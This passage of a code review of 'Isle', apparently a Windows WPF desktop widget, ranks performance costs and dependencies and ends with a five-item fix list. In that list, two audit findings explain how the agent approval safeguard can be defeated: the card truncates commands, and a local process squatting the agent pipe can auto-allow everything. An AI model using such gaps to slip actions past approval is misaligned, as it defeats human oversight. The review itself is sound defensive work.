`ApplyExStyle` cannot tell a failure from a previous style of 0 — and those entry points do not exist in 32-bit
`user32.dll`, so the app is x64-only by accident rather than by decision.

## L5. Small unbounded growth
- `MediaSession._lastActive` (`MediaSession.cs:32`) — one entry per AUMID ever seen, never pruned.
- `NotificationsSource._seen` (`Sources.cs:670`) — one `uint` per toast for the process lifetime.
- `ClipStore` caps entries at 200 but not bytes: 200 full-resolution PNGs can be several hundred MB in
  `%APPDATA%\Isle\clip`. Add a total-bytes budget to `Trim()`.
- `ShellIcons.Cache` (`ShellIcons.cs:17`) dumps the whole cache at 300 entries rather than evicting — a cliff,
  not a leak.

## L6. `OnDragOver` re-selects the tab on every drag-move event
`src/Isle/IslandWindow.Drop.cs:20-32` — `SelectTab(t.TabId, animate: true)` runs per `DragOver`, which fires many
times per second. `ShowTab` early-returns, but `TabBar.Select(id, animate: true)` may restart its indicator
animation each time. Guard with `if (_currentTab != t.TabId)`.

---

# Efficiency: measured-by-reading

Every periodic wakeup and retained cost I could find, with default settings (`live.*` on except notifications,
`HideInFullscreen` on, `chars.inPill` off, `ShowClock` off, music not playing). Costs are reasoned estimates from
the work each tick performs, not measurements.

| Source | File | Interval | Runs when | Estimated cost |
|---|---|---|---|---|
| Keyboard-layout check | `Sources.cs:582` | **500 ms** | always, module on | 2 wakeups/s; 4 P/Invokes + culture lookup. Small CPU, but the main obstacle to CPU idle. |
| Fullscreen housekeeping | `Hover.cs:307` | **2 s** | `HideInFullscreen` (default on) | full monitor enumeration + 5 window queries + allocations per tick (M5) |
| OBS probe | `Sources.cs:326` | **15 s** | always, module on | 2× full system process-table snapshot; by far the most expensive single tick (H1) |
| Downloads sampler | `Sources.cs:58` | **1 s** | any tracked partial file — **including a stale one forever** (H2) | `File.Exists` + `FileInfo` + 2 LINQ allocations per tick |
| Agents tidy | `AgentsModule.cs:125` | 1 min | only while a session is "working" | negligible, correctly self-stopping |
| Weather refresh | `WeatherModule.cs:48` | 30 min | a place is configured | one HTTPS round trip; fine |
| Collapse trim | `Hover.cs:144` | 5 s after **every** collapse | always | blocking compacting gen2 GC + `EmptyWorkingSet` + a log line (H3) — the single largest avoidable CPU spike in normal use |
| Hover cursor timer | `Hover.cs:29` | 30 ms | only while engaged/expanded | as specified; correctly gated |
| Equalizer animation | `Bits.cs:89-96` | 20 fps | music playing **and** pill visible | small dirty rect, but every frame is CPU-rasterized + presented through a layered window |
| Pill creature | `CreatureView.cs:34-99` | 8–30 fps | `chars.inPill` on and collapsed pill visible | 30 fps whenever the mouse moves anywhere (H5) |
| Marquee scroll | `Bits.cs:145` | 30 fps | hover over a too-long title | bounded by hover |
| Clipboard listener | `ClipboardService.cs:67` | event | always, module on | zero idle; expensive per copy (H4) |
| Registry watcher (mic/cam) | `Sources.cs:270-309` | event | always, module on | `RegNotifyChangeKeyValue`, genuinely event-driven; correct |
| `FileSystemWatcher` ×(1+libs) | `Sources.cs:52, 474` | event | always, module on | one kernel buffer each; events are UI-thread reads (M9) |
| WinEventHook (foreground) | `ForegroundWatcher.cs:27` | event | always | correct, delegate rooted in a field |
| `WH_KEYBOARD_LL` | `Sources.cs:634` | **every keystroke machine-wide** | always, module on | C1 — not an idle cost, a latency hazard |
| Retained: tab views | `Content.cs:146-158` | — | after first open, forever | every opened tab stays in the visual tree (`Visibility.Collapsed`); "heavy resources released after 2 min" is only `EmptyWorkingSet`, not release |
| Retained: `Microsoft.Windows.SDK.NET.dll` | project | — | always | 24 MB on disk, mapped lazily; see below |

### Rendering model
`AllowsTransparency="True"` (`IslandWindow.xaml:6`) makes this a layered window, which WPF presents by handing a
CPU-side bitmap to `UpdateLayeredWindow` ([Transparent Windows in WPF](https://learn.microsoft.com/en-us/archive/blogs/dwayneneed/transparent-windows-in-wpf)): "The bitmap for the window is allocated by the
application, and is passed to the OS which makes a copy." Microsoft's guidance is explicitly about update
area and frequency: "For performance improvements, reduce the amount of updates to the window,
in either frequency or area. WPF is optimized around dirty rect updates, so if you change just a portion of the
window, WPF will be able to update just that portion to the screen." Combined with
`RenderMode.SoftwareOnly` (`App.xaml.cs:52-53`) — where the same source warns "We do offer a
software rendering fallback, but that is intended to provide a full-featured fallback, not for high
performance." — every animated frame is a CPU rasterization.

The expand/collapse animation is the worst case: `ApplyShape()` rewrites the clip plus three shadow geometries,
and animates `Panel.Opacity` **and** `PanelScale` over a 520×220 subtree full of text
(`Motion.cs:400-427`). An opacity+scale animation over a live subtree re-rasterizes that whole subtree every
frame, 60×/s, in software.

### Ranked cuts
1. **Remove `Memory.TrimSoon` from `Collapse()`** (H3). Removes a blocking compacting gen2 GC from every
   hover cycle. Expected: the largest single CPU and jank reduction in daily use; costs you the vanity 25 MB.
2. **Move the Caps Lock hook off the UI thread, or delete the source** (C1). Removes a machine-wide input-latency
   hazard. Deleting it also removes one of the two reasons the app looks like a keylogger to security tooling.
3. **Fix the Downloads sampler stop condition** (H2) and **make the OBS probe cheap + backed off** (H1).
   Together these remove a 1 Hz poll and a 15 s process enumeration from a typical machine.
4. **Add `CacheMode = new BitmapCache { SnapsToDevicePixels = false }` to `Panel` for the duration of the
   expand/collapse animation** (set it in `SetTargets` when `_animating` becomes true, clear it in
   `StopAnimation`). The panel's content does not change during the animation — only its opacity and scale — so
   WPF can rasterize once and blend a cached bitmap per frame instead of re-rendering text and vectors 60×/s.
   `UNVERIFIED — needs a run on Windows`: compare `PerfView`/Task Manager CPU across 20 expand/collapse cycles
   with and without the cache; also check the cached bitmap does not look soft at 150 % scale (raise
   `RenderAtScale` to `UiScale.ScaleX` if it does).
5. **Raise the layout check to 2 s or make it event-driven** (H1) and **cache the monitor list** (M5).
6. **Shrink the layered surface while collapsed.** The window is always `640×300` DIPs even when showing a
   `120×32` pill, so every present copies ~24× more pixels than the pill needs. The spec forbids *per-frame*
   resizing, not resizing once when the spring settles: in `StopAnimation()`, `SetWindowPos` the window to
   `pill + shadow + overshoot` bounds and shift `Stage` by the same amount; grow it back at the start of an
   expand before the first frame. This is the highest-ceiling change here and also the riskiest (hit-testing in
   `IsCursorInside`, `Reposition` centring, DPI rounding), so measure cut #4 first.
   `UNVERIFIED — needs a run on Windows`: measure CPU with music playing (equalizer at 20 fps) before and after.
7. **Move clipboard encode/hash off the UI thread** (H4) and cap at ~8 MP.

### Dependency weight
| Package | Used by | Verdict |
|---|---|---|
| `Microsoft.Windows.SDK.NET.dll` (24 MB, from the TFM) | GSMTC (media), `Windows.Devices.Radios`, Bluetooth, `Windows.Media.Ocr`, `Windows.Graphics.Capture`, `MediaTranscoder`, `UserNotificationListener` | **Carries its weight.** Seven independent features. It is a projection assembly: mostly metadata, paged in lazily, so the disk cost is real and the RAM cost largely is not. Not worth fighting. |
| `Anthropic` (11 MB) | `AnthropicProvider` only — streaming messages, images, PDF blocks, typed exceptions | **Replaceable.** You already have a hand-written OpenAI-compatible streaming client (`OpenAiProvider`). The Anthropic Messages SSE protocol is ~150 lines of the same shape. Dropping it saves ~11 MB on disk and removes the only dependency whose major-version churn can break your build. The cost is losing the typed exception mapping (`AnthropicProvider.cs:87-100`), which you would replace with status-code mapping. Worth doing if binary size matters; otherwise leave it. |
| `Whisper.net` + `Whisper.net.Runtime` | Voice | Essential, and the native parts must stay loose on disk (as `PROGRESS.md` notes). |
| `Vortice.Direct3D11` | `Recorder` only | Essential for the D3D11 path; no lighter option that keeps hardware H.264. |
| `NAudio.Wasapi` | `MicCapture`, `Recorder` audio | Essential; the resampler and mixer alone justify it. |
| `PdfPig` | `Attachments.PdfText` — text extraction for providers without document input | **Marginal.** Anthropic takes PDFs as base64 document blocks directly (`AnthropicProvider.cs:59-61`), so PdfPig only serves OpenAI-compatible endpoints. Consider making it the fallback path only, or dropping it and sending "PDF not supported by this provider". |
| `ZXing.Net` | QR reading | Cheap, pure managed, one clear feature. Fine. |
| `System.Management` (WMI) | `Brightness` only (`SystemControls.cs:180, 215`) | **Weakest dependency.** It pulls in WMI for one laptop-brightness slider, and each call spins up a `ManagementObjectSearcher`. Keep only if he actually uses the brightness slider on a laptop panel; otherwise drop the feature and the package. |

The csproj sets no `PublishReadyToRun`, `PublishSingleFile` or trimming. For a 365–527 ms startup that is already
fine; R2R would shave JIT time off the first frame at the cost of a noticeably larger binary. `InvariantGlobalization=false`
is correct (you need `uk-UA`, Ukrainian reminder parsing, `CultureInfo.GetCultureInfo(langId)`).

---

---

# Sources cited

- *LowLevelKeyboardProc callback function* — Microsoft Learn — https://learn.microsoft.com/windows/win32/winmsg/lowlevelkeyboardproc
- *Named pipes under attack: Securing Windows interprocess communication* — BleepingComputer — https://www.bleepingcomputer.com/news/security/named-pipes-under-attack-securing-windows-interprocess-communication/
- *Transparent Windows in WPF* — Dwayne Need, Microsoft Learn archive — https://learn.microsoft.com/en-us/archive/blogs/dwayneneed/transparent-windows-in-wpf

# If you only fix five things

1. **Get the `WH_KEYBOARD_LL` hook off the UI thread, or delete the Caps Lock source** (C1). It is the only
   defect here that degrades the whole machine, and Windows removes the hook silently when it misbehaves.
2. **Stop truncating the command in the agent approval card** (C3). An approval UI that hides what is being
   approved is worse than no approval UI, because it manufactures confidence.
3. **Harden the agent pipe** (C2): `FIRST_PIPE_INSTANCE` on the server, server-process verification in the hook
   client, random pipe name in a user-only file. Without this, a local squatter can auto-allow everything.
4. **Delete `Memory.TrimSoon(5)` from `Collapse()`** (H3). One line. Removes a blocking compacting gen2 GC from
   every hover and gives up only a cosmetic memory number.
5. **Fix the two runaway polls** — the Downloads sampler stop condition (H2) and the OBS process enumeration
   (H1) — and raise the 500 ms layout check (H1). This is what makes the "event-driven" claim in `SPEC.md` §2
   actually true.
